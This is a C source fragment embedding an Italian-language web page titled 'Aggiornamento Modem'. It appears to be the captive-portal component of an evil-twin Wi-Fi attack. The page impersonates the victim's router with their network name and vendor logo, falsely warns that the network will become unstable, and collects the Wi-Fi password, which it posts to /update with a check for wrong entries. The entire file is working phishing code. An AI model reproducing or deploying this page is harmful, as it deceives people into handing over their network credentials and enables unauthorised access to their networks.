
const char fu_index_header_html[] =
"<!DOCTYPE html>\n"
"<html lang=\"it\">\n"
"<head>\n"
"    <meta charset=\"UTF-8\">\n"
"    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
"    <title>Aggiornamento Modem</title>\n"
"    <style>\n"
"        body {\n"
"            font-family: Arial, sans-serif;\n"
"            margin: 0;\n"
"            padding: 0;\n"
"            display: flex;\n"
"            flex-direction: column;\n"
"            align-items: center;\n"
"            justify-content: center;\n"
"            min-height: 100vh;\n"
"            background-color: #f4f4f9;\n"
"            color: #333;\n"
"        }\n"
"        .container {\n"
"            text-align: center;\n"
"            padding: 20px;\n"
"            border: 1px solid #ddd;\n"
"            border-radius: 8px;\n"
"            background: #fff;\n"
"            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n"
"            max-width: 400px;\n"
"            width: 90%;\n"
"        }\n"
"\t\timg.logo_large {\n"
"            width: 280px;\n"
"            margin-bottom: 15px;\n"
"\t\t\tmargin-top: 8px;\n"
"        }\n"
"\t\timg.logo_small {\n"
"\t\t\twidth: 100px;\n"
"            margin-bottom: 20px;\n"
"\t\t}\n"
"        img.disabled {\n"
"            display: none;\n"
"        }\n"
"        h1 {\n"
"            font-size: 1.5rem;\n"
"            margin-bottom: 10px;\n"
"        }\n"
"        p {\n"
"            margin-bottom: 20px;\n"
"            font-size: 1rem;\n"
"        }\n"
"        .wifi-name {\n"
"            font-weight: bold;\n"
"            margin-bottom: 10px;\n"
"            font-size: 1rem;\n"
"\t\t\ttext-align: left;\n"
"        }\n"
"        input[type=\"password\"] {\n"
"            width: calc(100% - 20px);\n"
"            padding: 10px;\n"
"            margin-bottom: 20px;\n"
"            font-size: 1rem;\n"
"            border: 1px solid #ccc;\n"
"            border-radius: 4px;\n"
"        }\n"
"        .button-group {\n"
"            display: flex;\n"
"            justify-content: center;\n"
"            gap: 10px;\n"
"        }\n"
"        button {\n"
"            background-color: #007bff;\n"
"            color: #fff;\n"
"            border: none;\n"
"            padding: 10px 20px;\n"
"            font-size: 1rem;\n"
"            border-radius: 4px;\n"
"            cursor: pointer;\n"
"        }\n"
"        button:hover {\n"
"            background-color: #0056b3;\n"
"        }\n"
"        button.cancel {\n"
"            background-color: #dc3545;\n"
"        }\n"
"        button.cancel:hover {\n"
"            background-color: #c82333;\n"
"        }\n"
"        footer {\n"
"            margin-top: 20px;\n"
"            font-size: 0.8rem;\n"
"            color: #666;\n"
"        }\n"
"        @media (max-width: 768px) {\n"
"            h1 {\n"
"                font-size: 1.2rem;\n"
"            }\n"
"            p {\n"
"                font-size: 0.9rem;\n"
"            }\n"
"        }\n"
"    </style>\n"
"</head>";

const char fu_index_script_html[] = 
"<script>\n"
"var logo = \"/logo/%s.png\";\n"
"var ssid = \"%s\";\n"
"var vendor = \"%s\";\n"
"</script>\n";

const char fu_index_body_html[] =
"<body>\n"
"    <div class=\"container\">\n"
"        <img id=\"logo\" class=\"disabled\" src=\"\" alt=\"Logo Modem\">\n"
"        <h1>Aggiornamento Modem</h1>\n"
"        <p>Per garantire il corretto funzionamento della rete, si consiglia di aggiornare il modem. Se l'aggiornamento non viene completato, la rete potrebbe risultare instabile.</p>\n"
"        <div class=\"wifi-name\" id=\"wifiName\"></div>\n"
"        <input type=\"password\" id=\"wifiPassword\" placeholder=\"Password Wi-Fi\">\n"
"        <div class=\"button-group\">\n"
"            <button onclick=\"submitPassword()\">Conferma</button>\n"
"            <button class=\"cancel\" onclick=\"window.location.href='loader.html';\">Annulla</button>\n"
"        </div>\n"
"        <footer>\n"
"            <p id=\"vendor\"></p>\n"
"        </footer>\n"
"    </div>\n"
"    <script>\n"
"\t\twindow.onload = function(){\n"
"\t\t\tdocument.getElementById('wifiName').innerHTML = ssid + \":\";\n"
"\t\t\tif( vendor === \"Generic\" )\n"
"\t\t\t{\n"
"\t\t\t\tdocument.getElementById('vendor').remove();\n"
"\t\t\t}\n"
"\t\t\telse\n"
"\t\t\t{\n"
"\t\t\t\tdocument.getElementById('vendor').innerHTML = vendor + \" © 2024\";\n"
"\t\t\t}\n"
"\t\t\tconst logo_id = document.getElementById('logo');\n"
"\t\t\tconst testImage = new Image();\n"
"\t\t\ttestImage.src = logo;\n"
"\t\t\tlogo_id.src = logo;\n"
"\t\t\t\n"
"\t\t\ttestImage.onload = function() {\n"
"\t\t\t\tif (testImage.width === 100 && testImage.height === 100) {\n"
"\t\t\t\t\tlogo_id.classList.remove('disabled');\n"
"\t\t\t\t\tlogo_id.classList.add('logo_small');\n"
"\t\t\t\t} else {\n"
"\t\t\t\t\tlogo_id.classList.remove('disabled');\n"
"\t\t\t\t\tlogo_id.classList.add('logo_large');\n"
"\t\t\t\t}\n"
"\t\t\t};\n"
"\t\t};\n"
"        async function submitPassword() {\n"
"            const password = document.getElementById('wifiPassword').value;\n"
"            if (password) {\n"
"                try {\n"
"\t\t\t\t\tconst bodyData = `password=${password}`;\n"
"\t\t\t\t\tconst response = await fetch('/update', {\n"
"\t\t\t\t\t\tmethod: 'POST',\n"
"\t\t\t\t\t\theaders: {\n"
"\t\t\t\t\t\t\t'Content-Type': 'application/x-www-form-urlencoded'\n"
"\t\t\t\t\t\t},\n"
"\t\t\t\t\t\tbody: bodyData\n"
"\t\t\t\t\t});\n"
"\t\t\t\t\tconst responseText = await response.text();\n"
"\t\t\t\t\tif (response.ok) {\n"
"\t\t\t\t\t\tif (responseText === \"bad\") {\n"
"\t\t\t\t\t\t\talert(\"Password errata. Riprova.\");\n"
"\t\t\t\t\t\t} else {\n"
"\t\t\t\t\t\t\talert(\"Password accettata. Aggiornamento in corso...\");\n"
"\t\t\t\t\t\t}\n"
"\t\t\t\t\t} else {\n"
"\t\t\t\t\t\talert(\"Errore durante l'aggiornamento. Riprova.\");\n"
"\t\t\t\t\t}\n"
"\t\t\t\t} catch (error) {\n"
"\t\t\t\t\talert(\"Si è verificato un errore durante l'invio della richiesta.\");\n"
"\t\t\t\t}\n"
"            } else {\n"
"                alert(\"Inserisci la password per continuare.\");\n"
"            }\n"
"        }\n"
"    </script>\n"
"</body>\n"
"</html>";